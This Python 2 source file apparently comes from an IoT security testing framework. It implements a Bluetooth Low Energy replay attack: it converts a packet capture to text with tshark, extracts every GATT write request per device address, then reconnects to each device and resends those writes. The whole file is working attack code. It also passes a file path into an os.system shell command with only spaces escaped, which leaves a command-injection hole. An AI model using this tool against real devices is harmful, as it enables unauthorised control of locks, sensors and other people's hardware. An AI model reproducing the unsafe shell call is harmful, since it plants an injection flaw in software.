import os
from protocols.BLE.ble_device import BLEDevice

"""
    This is the helper class which is used to perform BLE Replay attack.
"""


class BLEReplayAttackHelper:
    def __init__(self, file_path):
        self.file_path = file_path
        self.write_requests = {}
        self.run()

    def run(self):
        self.create_tmp_file()
        self.get_write_requests()
        self.replay_write_requests()
        self.delete_tmp_file()

    """
        Convert pcap file to txt
    """

    def create_tmp_file(self):
        # convert pcap file to .txt file
        file_path = "\\ ".join(self.file_path.split())
        os.system("tshark -X lua_script:tmp.txt -r " + file_path + " -V -T text > tmp.txt")

    """
        Retrieves all write requests from the given file
    """

    def get_write_requests(self):
        # open the file
        f = open("tmp.txt", "r")
        # get the content of the file
        content = f.read()
        # get frames
        frames = content.split("\n\n")
        # search each frame to find Write Requests
        for frame in frames:
            try:
                # slave address index
                slave_address_index = frame.index("Slave Address:")
                # update the frame
                frame = frame[slave_address_index:]
                # get the slave address
                open_para_index = frame.index("(")
                close_para_index = frame.index(")")
                slave_address = frame[open_para_index + 1:close_para_index]
                # write request index
                write_request_index = frame.index("Opcode: Write Request")
                # update the frame
                frame = frame[write_request_index:]
                # handle index
                handle_index = frame.index("Handle:") + 8
                # update the frame
                frame = frame[handle_index:]
                # space index
                space_index = frame.index(" ")
                # get the handle
                handle = frame[:space_index]
                # value index
                value_index = frame.index("Value:") + 7
                # get the value
                value = frame[value_index:]
                # add handle-value to the list
                if slave_address in self.write_requests:
                    self.write_requests[slave_address].append({"handle": handle, "value": value})
                else:
                    self.write_requests[slave_address] = [{"handle": handle, "value": value}]
            except ValueError:
                pass
        print "retrieved write requests"

    """
        Replay all write requests
    """

    def replay_write_requests(self):
        # replay all write request
        for slave_address in self.write_requests:
            # create a connection to the device
            device = BLEDevice(slave_address)
            # replay all write request belonging to the device
            for handle_value_pair in self.write_requests[slave_address]:
                handle = handle_value_pair["handle"]
                value = handle_value_pair["value"]
                device.writecmd(handle, value)
                print "wrote " + value + " to handle: " + handle

    """
        Delete the created tmp file
    """

    def delete_tmp_file(self):
        os.remove("tmp.txt")
